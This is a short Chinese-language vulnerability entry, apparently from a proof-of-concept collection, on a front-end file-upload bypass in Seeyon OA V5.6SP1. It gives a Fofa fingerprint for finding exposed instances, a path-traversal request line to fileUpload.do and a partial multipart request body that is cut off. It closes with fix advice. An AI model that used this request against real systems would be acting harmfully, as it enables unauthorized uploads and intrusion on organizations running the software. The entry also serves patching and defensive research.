# 致远互联-OA前台fileUpload.do绕过文件上传

- **系统**：致远OA　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`title="协同管理软件 V5.6SP1"`
- **请求**：`POST /seeyon/autoinstall.do/../../seeyon/fileUpload.do?method=processUpload HTTP/1.1`

**请求体 / payload**
```
1. Fofa
title="协同管理软件 V5.6SP1"
2、部分界面如下
3、隐患url,复现如下
Host: your-ip
Content-Type: multipart/form-data; boundary=00content0boundary00
--00content0boundary00
Content-Disposition: form-data; name="type"
--00content0boundary00
Content-Disposition: form-data; name="extensions"
png
--00content0boundary00
Content-Disposition: form-data; name="applicationCategory"
--00content0boundary00
Content-Disposition: form-data; name="destDirectory"
--00content0boundary00
Content-Disposition: form-data; name="destFilename"
--00content0boundary00
Content-Disposition: form-data; name="maxSize"
--00content0boundary0…（脚本共 1072 字，完整版见原文）
```

**其他**
- 修复建议: 1、请联系厂商进行修复或升级到安全版本。
2、如非必要，禁止公网访问该系统。
3、设置白名单访问。